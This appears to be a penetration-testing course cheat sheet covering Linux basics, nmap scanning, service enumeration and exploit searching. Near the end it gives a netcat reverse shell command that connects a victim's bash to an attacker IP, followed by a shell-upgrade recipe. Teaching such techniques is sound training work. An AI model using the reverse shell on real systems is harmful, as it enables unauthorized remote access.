# VAPT Course Cheat Sheet
This Repository is intended to support VAPT Course. All cheats we need in the course is lay down here. Enjoy!
-----------

## Linux Basic
### Whoami
Print active User ID  
> Whoami

### pwd  
Print Working directory
> pwd

### mkdir
Make Directory
> mkdir pentest

### cd
Change directory
> cd pentest // Change directory to pentest (Inside Working Directory)
cd /var // change directory to var (Outside Working Directory)
cd //Back to home Directory
cd .. // Directory Up

### ls
List files in working Directory
> ls
ls -la // Print out all files including hidden files

### which
Locate executable file full path
> which nmap // Locate the full path of nmap  

### man
Manual Page of a Command
> man which // Manual page of which Command
man -k "change password" // Search for command to change password

### locate
Find / Search for files
> locate -i passwd // Find for passwd files with case-Insensitive

### wget
Download a file
> wget http://<IP>:<Port>/access_log.txt

### cat
Concatenate / print contents of a files
> cat access_log.txt

### head
Cat only first 10 lines of a file
> head access_log.txt

### tail
Cat only last 10 lines of a file
> less access_log.txt

### cp
Copy file
> cp access_log.txt access_log.txt.backup

### mv
Rename or cut a file
> mv access_log.txt exercise.txt

### grep
Search for specific word in a file  
> grep admin exercise.txt

### wc
Count lines, words, bytes, of a files
> wc exercise.txt

### sort
Sort files
> sort -u exercise.txt // Sort unique lines on exercise.txt

### tab completion
Automatically fill the command/files names we write
> cat ex<TAB> // will show exercise.txt


### CTF Part 1.1

### Piping & Redirection
Piping ( | ) is a command that let you use two or more commands such that output of one command serves as input to the next command.
> cat exercise.txt // Will show all lines of exercises.txt
cat exercise.txt | grep admin // will only show line contain admin
cat exercise.txt | grep admin | wc -c // Count bytes of above output

Redirection  is change the output of command to a files
> cat exercise.txt | grep admin > admin_exercise.txt
echo "This will overwrite" > admin_exercise.txt | Overwrite exercise.txt with "This will overwrite", or make exercise.txt file if it is not exists
echo "This will not overwrite" >> admin_exercise.txt | write "This will not overwrite" to the last line of exercise.txt

### Latihan 1
Bacalah file /etc/passwd , kemudian ambil line yang mengandung /bin/bash, jadikan ke dalam sebuah file bernama user.txt !

### cut
Cutting out some section of a file
> cat user.txt | cut -d ":" -f 1 //Menampilkan hanya colomn 1

### awk
More powerful than Cut
> cat user.txt | awk -F ":" '{print $1 $2}'
awk -F ":" '{print "Terdapat user bernama " $1}'

### CTF Part 1.2


## Scanning
### NMAP Command
| # | Options |Description |
| --- | --- | --- |
|1| -sT | TCP Connect port scan|
|2| -sU | UDP Port scan |
|3| -p  | specific port scan|
|4| -p- | Scan All ports|
|5| -sV | Check Version of running service |
|6| -sC | Scan with default safe Scripts |
|7| -O | OS Fingerprinting |

| # | Command | Scan For |
| --- | --- | --- |
|1| nmap -sV `Target_IP` | Open TCP Ports and versions |
|2| nmap -sT `Target IP` | Open TCP Ports |
|3| nmap -sU `Target IP` | Open UDP Ports |
|4| nmap -sC -sV -p- `Target IP` | Open All TCP Ports and Versions + Scan with default NSE Scripts |
|5| nmap --vuln `Target IP` | Scan for vulnerability () |

### Search for NMAP Scripts
```
ls /usr/share/nmap/scripts
```

### Interesting ports
| Port # | Description |
| --- | --- |
| 21 | FTP server, unencrypted. |
| 22 | SSH server, can be connected to via SSH |
| 23 | Telnet. Basically an unencrypted SSH |
| 25 | SMTP - Email sending service. [Query it](#SMTP-Email-Enumeration) to enum email addresses? |
| 69 | TFTP Server.  Very uncommon and old. Uses UDP. |
| 80 | HTTP Server, hosting website? Try visiting IP with web browser |
| 88 | Kerberos Service.  Check, [MS14-068](https://labs.f-secure.com/archive/digging-into-ms14-068-exploitation-and-defence/) |
| 110 | POP3 mail service.  Login via telnet or SSH? |
| 111 | RPCbind. This can help us look for NFS-shares |
| 119 | Network Time Protocol |
| 135 | MSRPC - Microsoft RPC |
| 139 | SMB Service. likely vulnerable to an SMB RCE |
| 161, 162 | SNMP Service |
| 389, 636 | LDAP Directory Service |
| 443 | HTTPS, check for HeartBleed? View certificate for information? |
| 445 | SMB Shares service, likely vulnerable to an SMB RCE |
| 587 | Submission.  If Postfix is run on it, it could be vunerable to shellshock |
| 631 | CUPS. Basically a Linux Printer Service for sharing printers. |
| 1433 | Default MSSQL port.  `sqsh -S 10.1.11.41 -U sa` |
| 1521 | Oracle DB. `tnscmd10g version -h 10.1.11.51` |
| 2021 | Oracle XML DB.  Check [Default Passwords](https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm) |
| 2049 | Network File System. `showmount -e 10.1.11.64` |
| 3306 | MySQL Database.  Connect: `mysql --host=10.1.11.69 -u root -p`|
| 3389 | Listening for RDP connection |

## Enumeration

### SSh
Connect to ssh : ssh username@ip
```
ssh kali@10.131.2.128
```
### FTP
Check for Anonymous login allowed
```
ftp open Target_IP
```
> Username: anonymous ; password sembarang

Download file from ftp
```
get <nama file>
```

### SMB
Connect ke SMB untuk mengecek Shares yang available
```
smbclient -L Target_IP
```

Connect ke salah satu shares
```
smbclient //Target_IP/Shares_name
```

### SMTP
Verify SMTP Port using netcat
```
nc -nv Target_IP 25
```

### POP3 Enumeration
```
root@kali:~# telnet $ip 110
+OK beta POP3 server (JAMES POP3 Server 2.3.2) ready
USER billydean    
+OK
PASS password
+OK Welcome billydean

list

+OK 2 1807
1 786
2 1021

retr 1

+OK Message follows
From: jamesbrown@motown.com
Dear Billy Dean,

Here is your login for remote desktop ... try not to forget it this time!
username: billydean
password: PA$$W0RD!Z
```

### HTTP Enumeration
- Common Sensitive Directory
|/admin|/dashboard|/phpMyAdmin|
|----|----|----|
|/adm|/cpanel|/manage|
|/4dm1n|/root|/pma |
/login| /cms| dan lainnya|

- Wordlists

- Dirb

- Nikto
Scanning web menggunakna nikto
```
nikto -H http://<ip_target>
```
- WPScan (Wordpress Scanner)
```
wpscan --url http://target.com
```

### Search For Public Exploit
Google Search, Github, Exploit-DB

Searchsploit
```
searchsploit linux 2.2.0
```
> Mencari exploit dengan keyword tertentu contoh linux 2.2.0

Mendownload (Copy) exploit ke working directory
```
searchsploit -m Nomor_Exploit
```

Download File
```
wget Alamat_URL
```


### Reverse shell
Membuat Listener Pada Machine Attacker (Kali), contoh untuk port 4444
```
nc -nlvp 4444
```
Kemudian pada Victim:
```
nc -nv IP_Attacker Port -e /bin/bash
```

### Upgrade ke Interactive shell
```
python -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo
fg
<ENTER>
<ENTER>
```
